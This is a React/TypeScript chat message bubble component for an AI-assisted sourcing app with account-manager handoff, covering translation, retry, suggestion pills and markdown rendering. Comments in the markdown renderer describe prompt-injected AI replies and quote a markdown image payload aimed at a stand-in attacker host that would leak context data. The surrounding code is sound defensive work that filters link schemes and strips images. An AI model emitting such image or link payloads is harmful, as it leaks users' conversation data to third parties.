"use client";

import { memo } from "react";
import { motion } from "framer-motion";
import { CheckCheck, RotateCw, UserRound } from "lucide-react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { cn } from "@/lib/utils";
import type { Message } from "@/types/chat";
import { ProfileSummaryCard } from "./ProfileSummaryCard";
import { MessageAttachments } from "./MessageAttachments";

// Native-script labels for the languages the AM can read the thread in.
// Used as the heading on the translated secondary line in the AM view.
const DISPLAY_LANGUAGE_LABELS: Record<string, string> = {
  zh: "中文",
  hi: "हिन्दी",
};

interface MessageBubbleProps {
  message: Message;
  // True once the buyer has clicked Request human review (sticky for the
  // rest of the session). Swaps the CTA on the profile card for the
  // "Transferring…" badge.
  reviewRequested?: boolean;
  // True while the request_review POST is in flight — shows a spinner on
  // the CTA. Parent owns the loading flag because it owns the fetch.
  reviewSubmitting?: boolean;
  onRequestReview?: () => void;
  // Called when the user clicks Retry on an error bubble. Re-sends the
  // last user message via the chat hook.
  onRetry?: () => void;
  // Disables the retry button while a request is in flight.
  retryDisabled?: boolean;
  // Whose perspective are we rendering for? Default "buyer" — buyer
  // messages align right (self), AM/AI on the left (incoming). On the
  // AM dashboard, pass "account_manager" so AM messages flip to the
  // right and buyer messages render on the left. Drives alignment +
  // bubble styling only — content + attribution labels stay the same.
  viewerRole?: "buyer" | "account_manager";
  // Buyer's currently-selected session language. When this matches a
  // message's translatedTo we render translatedContent as the primary
  // text and the original as a muted secondary line. Ignored for
  // account_manager viewers (they use amDisplayLanguage instead).
  sessionLanguage?: string;
  // AM dashboard only: the ISO 639-1 code the AM picked to read the
  // thread in ("en" / "zh" / "hi"), or "" / undefined for "original
  // only". When
  // set and the message has a cached translation for it
  // (message.translations[amDisplayLanguage]), the bubble shows the
  // original as primary and the translation as a muted secondary line.
  amDisplayLanguage?: string;
  // Quick-reply pill click handler. Only wired for the buyer viewer on
  // the latest agent message — parent decides which bubble is "latest"
  // and only passes the handler there. Sends the pill's text as a
  // regular user message.
  onSuggestion?: (text: string) => void;
}

function MessageBubbleImpl({
  message,
  reviewRequested = false,
  reviewSubmitting = false,
  onRequestReview,
  onRetry,
  retryDisabled,
  viewerRole = "buyer",
  sessionLanguage = "en",
  amDisplayLanguage,
  onSuggestion,
}: MessageBubbleProps) {
  if (message.role === "divider") {
    return <Divider label={message.content} />;
  }

  const isAccountManager = message.from === "account_manager";
  // "self" = the sender we should align right (with the dark bubble).
  const isSelf =
    viewerRole === "buyer"
      ? message.role === "user"
      : isAccountManager;
  // Keep the existing variable name to minimise downstream churn — the
  // semantics are now "render as outgoing/self bubble".
  const isUser = isSelf;

  // AM dashboard only: give the prior AI interview messages the same dark
  // "house" bubble as the AM's own replies so they read as one side
  // (Nexcierge) and stay visually distinct from the buyer's white
  // messages. Alignment is unchanged — AI stays on the incoming side; only
  // the colour (and the matching dark markdown theme below) flips.
  const isAiInAmView =
    viewerRole === "account_manager" &&
    message.role === "agent" &&
    !isAccountManager;

  // Two independent translation modes decide what shows as the primary
  // bubble text and what (if anything) sits below it as a muted line:
  //
  //  • Buyer viewer — the AM's reply localised into the buyer's language.
  //    The buyer reads the localisation (primary); the AM's original sits
  //    below. Honoured only when translatedTo matches the buyer's current
  //    language, so a mid-session language switch falls back to original.
  //  • AM viewer — any message rendered in the AM's chosen working
  //    language. The AM sees the original (what was sent) as primary and
  //    the translation below, per the dashboard's "original + translation"
  //    requirement.
  const buyerTranslation =
    viewerRole === "buyer" &&
    isAccountManager &&
    !!message.translatedContent &&
    !!message.translatedTo &&
    message.translatedTo === sessionLanguage;
  const amTranslation =
    viewerRole === "account_manager" && amDisplayLanguage
      ? message.translations?.[amDisplayLanguage]
      : undefined;

  let primaryText = message.content;
  let secondaryText: string | null = null;
  let secondaryLabel = "Original";
  if (buyerTranslation) {
    primaryText = message.translatedContent as string;
    secondaryText = message.content;
  } else if (amTranslation) {
    secondaryText = amTranslation;
    secondaryLabel =
      (amDisplayLanguage && DISPLAY_LANGUAGE_LABELS[amDisplayLanguage]) ||
      "Translation";
  }
  // When the agent attaches the RFQ summary card, let it use the full
  // chat-column width on mobile — capping at 88% squeezes the card and
  // its "Request human review" CTA on narrow screens. Plain text bubbles
  // keep the 88% cap so they read as messages, not full-width banners.
  const hasProfileCard = !!message.profileCard;
  return (
    <motion.div
      initial={{ opacity: 0, y: 6 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.35, ease: [0.22, 1, 0.36, 1] }}
      className={cn("flex", isUser ? "justify-end" : "justify-start")}
    >
      <div
        className={cn(
          "flex flex-col gap-3",
          hasProfileCard
            ? "w-full max-w-full sm:max-w-[88%]"
            : "max-w-[88%]",
          isUser ? "items-end" : "items-start",
        )}
      >
        {isAccountManager && viewerRole === "buyer" && (
          <div className="type-data flex items-center gap-1.5 px-1 text-xs font-semibold text-ink-soft">
            <span className="inline-flex h-4 w-4 items-center justify-center rounded-full bg-ink text-sheet">
              <UserRound className="h-2.5 w-2.5" strokeWidth={2.25} />
            </span>
            Account manager
          </div>
        )}
        {message.content && (
          <div
            className={cn(
              // ph-no-capture: keep buyer/AI message text out of PostHog
              // autocapture (see docs/TRACKING.md § Autocapture & PII).
              "ph-no-capture px-4 py-3 text-[15px] leading-relaxed",
              isUser
                ? "rounded-[12px_2px_12px_12px] bg-ink text-sheet whitespace-pre-wrap"
                : isAiInAmView
                  ? "rounded-[2px_12px_12px_12px] bg-ink text-sheet"
                  : message.error
                    ? "rounded-[2px_12px_12px_12px] bg-white border-[1.5px] border-redline text-red-900"
                    : "rounded-[2px_12px_12px_12px] bg-white border border-ink text-ink",
            )}
          >
            {isUser ? (
              <>
                {primaryText}
                {secondaryText && (
                  <>
                    <hr className="my-2.5 border-white/15" />
                    <div className="text-[12px] leading-relaxed text-white/65">
                      <div className="type-data mb-1 text-[11px] font-semibold text-white/55">
                        {secondaryLabel}
                      </div>
                      {secondaryText}
                    </div>
                  </>
                )}
              </>
            ) : message.error ? (
              <div>
                <div>{message.content}</div>
                {onRetry && (
                  <button
                    type="button"
                    onClick={onRetry}
                    disabled={retryDisabled}
                    className="mt-2 inline-flex items-center gap-1.5 rounded-sm border border-red-700/50 bg-white px-3 py-1 text-xs font-semibold text-red-700 transition-colors hover:bg-red-50 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blueprint disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <RotateCw className="h-3 w-3" strokeWidth={2} />
                    Retry
                  </button>
                )}
              </div>
            ) : (
              <>
                <AgentMarkdown content={primaryText} dark={isAiInAmView} />
                {secondaryText && (
                  <>
                    <hr
                      className={cn(
                        "my-2.5",
                        isAiInAmView ? "border-white/15" : "border-rule",
                      )}
                    />
                    <div
                      className={cn(
                        "text-[12px] leading-relaxed",
                        isAiInAmView ? "text-white/65" : "text-gray-500",
                      )}
                    >
                      <div
                        className={cn(
                          "type-data mb-1 text-[11px] font-semibold",
                          isAiInAmView ? "text-white/55" : "text-gray-400",
                        )}
                      >
                        {secondaryLabel}
                      </div>
                      <AgentMarkdown content={secondaryText} dark={isAiInAmView} />
                    </div>
                  </>
                )}
              </>
            )}
          </div>
        )}

        {message.attachments && message.attachments.length > 0 && (
          <MessageAttachments
            attachments={message.attachments}
            align={isUser ? "end" : "start"}
          />
        )}

        {/* Quick-reply pills — only rendered when the parent passes an
            onSuggestion handler (which it only does for the latest
            agent message). Clicking sends the pill text as a regular
            user message. Rendered BEFORE the profile card so the pills
            sit directly under the question they answer — a turn can
            carry both (the agent keeps asking optional follow-ups after
            the required set completes), and pills below the card read
            as orphaned. */}
        {!isUser &&
          !isAccountManager &&
          !message.error &&
          onSuggestion &&
          message.suggestions &&
          message.suggestions.length > 0 && (
            <div className="flex flex-wrap gap-2 pt-1">
              {message.suggestions.map((s) => (
                <button
                  key={s}
                  type="button"
                  onClick={() => onSuggestion(s)}
                  className="rounded-full border-[1.5px] border-ink bg-white px-3.5 py-1.5 text-[13px] font-semibold text-ink transition-all duration-150 hover:bg-paint focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blueprint active:translate-y-px"
                >
                  {s}
                </button>
              ))}
            </div>
          )}

        {message.profileCard && (
          <ProfileSummaryCard
            profile={message.profileCard}
            reviewRequested={reviewRequested}
            reviewSubmitting={reviewSubmitting}
            onRequestReview={onRequestReview}
            language={sessionLanguage}
          />
        )}

        {/* Read receipt under outgoing messages only — incoming bubbles
            don't need to tell the sender "I've read this". */}
        {isSelf && message.readAt && !message.error && (
          <div className="type-data inline-flex items-center gap-1 px-1 text-[11px] font-semibold text-gray-500">
            <CheckCheck className="h-3 w-3" strokeWidth={2} />
            Read
          </div>
        )}
      </div>
    </motion.div>
  );
}


// `dark` themes the colour-bearing elements (strong/links/code/headings/
// blockquote) for rendering on the dark "house" bubble used by AI messages
// in the AM dashboard. Base prose colour comes from the bubble's text-*
// class, so only the elements that hard-code a colour need flipping.
function AgentMarkdown({
  content,
  dark = false,
}: {
  content: string;
  dark?: boolean;
}) {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      components={{
        p: ({ children }) => (
          <p className="mb-2 last:mb-0">{children}</p>
        ),
        ul: ({ children }) => (
          <ul className="my-2 ml-4 list-disc space-y-1">{children}</ul>
        ),
        ol: ({ children }) => (
          <ol className="my-2 ml-5 list-decimal space-y-1">{children}</ol>
        ),
        li: ({ children }) => <li className="pl-1">{children}</li>,
        strong: ({ children }) => (
          <strong
            className={cn(
              "font-semibold",
              dark ? "text-white" : "text-gray-900",
            )}
          >
            {children}
          </strong>
        ),
        em: ({ children }) => <em className="italic">{children}</em>,
        a: ({ href, children }) => {
          // Only render http(s) / mailto links. Drops javascript:, data:,
          // and any other scheme that could exfiltrate or execute. Defends
          // against prompt-injected AI replies emitting malicious anchors.
          const safe =
            typeof href === "string" &&
            /^(https?:|mailto:)/i.test(href.trim());
          if (!safe) return <>{children}</>;
          return (
            <a
              href={href}
              target="_blank"
              rel="noopener noreferrer"
              className={cn(
                "underline underline-offset-2 transition-colors",
                dark
                  ? "text-paint hover:text-white"
                  : "text-blueprint hover:text-ink",
              )}
            >
              {children}
            </a>
          );
        },
        // Images are stripped: the AI is a text interviewer and has no
        // legitimate reason to send images. Without this, a prompt-injected
        // reply could embed ![](https://attacker/?ctx=...) and silently
        // exfiltrate data via the browser's automatic image fetch.
        img: () => null,
        code: ({ children }) => (
          <code
            className={cn(
              "rounded-sm px-1.5 py-0.5 font-mono text-[0.85em]",
              dark ? "bg-white/15 text-white" : "bg-gray-100 text-gray-800",
            )}
          >
            {children}
          </code>
        ),
        pre: ({ children }) => (
          <pre
            className={cn(
              "my-2 overflow-x-auto rounded-sm p-3 font-mono text-[13px]",
              dark ? "bg-white/10 text-white" : "bg-gray-100 text-gray-800",
            )}
          >
            {children}
          </pre>
        ),
        h1: ({ children }) => (
          <h1
            className={cn(
              "type-title mt-3 mb-2 text-base font-bold",
              dark ? "text-white" : "text-gray-900",
            )}
          >
            {children}
          </h1>
        ),
        h2: ({ children }) => (
          <h2
            className={cn(
              "type-title mt-3 mb-2 text-base font-bold",
              dark ? "text-white" : "text-gray-900",
            )}
          >
            {children}
          </h2>
        ),
        h3: ({ children }) => (
          <h3
            className={cn(
              "type-title mt-2 mb-1 text-[15px] font-bold",
              dark ? "text-white" : "text-gray-900",
            )}
          >
            {children}
          </h3>
        ),
        hr: () => (
          <hr
            className={cn("my-3", dark ? "border-white/20" : "border-rule")}
          />
        ),
        blockquote: ({ children }) => (
          <blockquote
            className={cn(
              "my-2 border-l-2 pl-3 italic",
              dark
                ? "border-white/30 text-white/80"
                : "border-rule-strong text-gray-700",
            )}
          >
            {children}
          </blockquote>
        ),
      }}
    >
      {content}
    </ReactMarkdown>
  );
}


// Full-width separator marking the switch from the AI sourcing
// conversation to the account-manager conversation after handoff. Sits
// outside the bubble layout so it doesn't pick up the user/agent
// alignment styles.
function Divider({ label }: { label: string }) {
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ duration: 0.3 }}
      className="flex items-center gap-3 py-2"
      role="separator"
      aria-label={label}
    >
      <span className="h-px flex-1 bg-rule-strong" />
      <span className="type-data text-xs font-semibold text-ink-soft">
        {label}
      </span>
      <span className="h-px flex-1 bg-rule-strong" />
    </motion.div>
  );
}


// Memoized: in a long chat, every keystroke and every streamed token used
// to re-render (and re-parse the markdown of) every bubble. With stable
// props from the chat page (stable callbacks, per-bubble retryDisabled /
// onSuggestion), only the bubble whose message changed re-renders.
export const MessageBubble = memo(MessageBubbleImpl);

export function TypingIndicator() {
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ duration: 0.2 }}
      className="flex justify-start"
    >
      <div className="rounded-[2px_12px_12px_12px] border border-ink bg-white px-4 py-3">
        <span className="inline-flex items-end gap-1">
          {[0, 0.15, 0.3].map((d) => (
            <span
              key={d}
              className="blip h-1.5 w-1.5 rounded-full bg-ink"
              style={{ animationDelay: `${d}s` }}
            />
          ))}
        </span>
      </div>
    </motion.div>
  );
}
